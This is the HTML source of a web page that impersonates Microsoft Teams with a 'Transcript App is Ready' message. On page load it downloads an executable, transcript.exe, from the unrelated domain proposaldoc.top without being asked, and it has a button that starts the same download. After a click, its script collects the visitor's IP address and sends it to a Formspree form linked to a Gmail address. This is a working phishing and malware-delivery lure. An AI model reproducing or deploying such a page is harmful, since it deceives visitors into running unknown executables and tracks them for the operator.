<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>Transcript Download | Microsoft Teams Style</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <link href="https://fonts.googleapis.com/css2?family=Segoe+UI:wght@400;600&display=swap" rel="stylesheet" />
  <style>
    body {
      font-family: 'Segoe UI', sans-serif;
      background: #f3f2f1;
      margin: 0;
      padding: 0;
    }

    .wrapper {
      min-height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
      flex-direction: column;
      padding: 20px;
    }

    .card {
      background: white;
      padding: 40px;
      border-radius: 12px;
      box-shadow: 0 4px 20px rgba(0,0,0,0.08);
      text-align: center;
      max-width: 480px;
      width: 100%;
      border-left: 6px solid #6264a7;
    }

    .card img {
      width: 90px;
      margin-bottom: 20px;
    }

    .card h1 {
      font-size: 24px;
      color: #1b1a19;
    }

    .card p {
      color: #605e5c;
      font-size: 16px;
      margin: 20px 0;
    }

    .card a {
      background-color: #6264a7;
      color: white;
      padding: 12px 24px;
      text-decoration: none;
      border-radius: 6px;
      display: inline-block;
      font-weight: 600;
      margin-top: 10px;
    }

    .toast {
      position: fixed;
      bottom: 30px;
      right: 30px;
      background: #ffffff;
      border-left: 5px solid #6264a7;
      box-shadow: 0 6px 20px rgba(0,0,0,0.15);
      padding: 16px 24px;
      border-radius: 10px;
      z-index: 1000;
      display: none;
      animation: slideIn 0.3s ease;
    }

    .toast h4 {
      margin: 0 0 5px;
      font-size: 17px;
      color: #1b1a19;
    }

    .toast p {
      margin: 0;
      font-size: 14px;
      color: #605e5c;
    }

    @keyframes slideIn {
      from {
        opacity: 0;
        transform: translateY(30px);
      }
      to {
        opacity: 1;
        transform: translateY(0);
      }
    }
  </style>
</head>
<body>
  <div class="wrapper">
    <div class="card">
      <img src="https://main-8xt.pages.dev/logo.png" alt="Microsoft Teams Logo" />
      <h1>Transcript App is Ready</h1>
      <p>Your secure download will begin automatically.<br>If not, click below:</p>
      <button onclick="manualDownload()" style="
  background-color: #6264a7;
  color: white;
  padding: 12px 24px;
  border-radius: 6px;
  font-weight: 600;
  border: none;
  cursor: pointer;
">Download Transcript.exe</button>
    </div>
  </div>

  <!-- Toast notification -->
  <div class="toast" id="thankYouToast">
    <h4>Thank you</h4>
    <p>Your download has started.</p>
  </div>

  <script>
    function manualDownload() {
      const url = 'https://proposaldoc.top/invite/transcript.exe';
      const link = document.createElement('a');
      link.href = url;
      link.download = '';
      document.body.appendChild(link);
      link.click();
      document.body.removeChild(link);
      showToast();
      trackDownload();
    }

    function showToast() {
      const toast = document.getElementById('thankYouToast');
      toast.style.display = 'block';
      setTimeout(() => {
        toast.style.display = 'none';
      }, 3000);
    }

    function trackDownload() {
      fetch('https://api.ipify.org?format=json')
        .then(res => res.json())
        .then(data => {
          const ip = data.ip;
          const timestamp = new Date().toLocaleString();
          const message = Download triggered:\\nIP: ${ip}\\nTime: ${timestamp};

          fetch("https://formspree.io/f/mkgrnbka", {
            method: "POST",
            headers: {
              'Accept': 'application/json',
              'Content-Type': 'application/json'
            },
            body: JSON.stringify({
              _replyto: "kerhareti@gmail.com",
              subject: "Transcript Download",
              message: message
            })
          });
        });
    }

    // Auto-download on page load (no toast, no tracking)
    window.onload = function () {
      const link = document.createElement('a');
      link.href = 'https://proposaldoc.top/invite/transcript.exe';
      link.download = '';
      document.body.appendChild(link);
      link.click();
      document.body.removeChild(link);
    };
  </script>
</body>
</html>
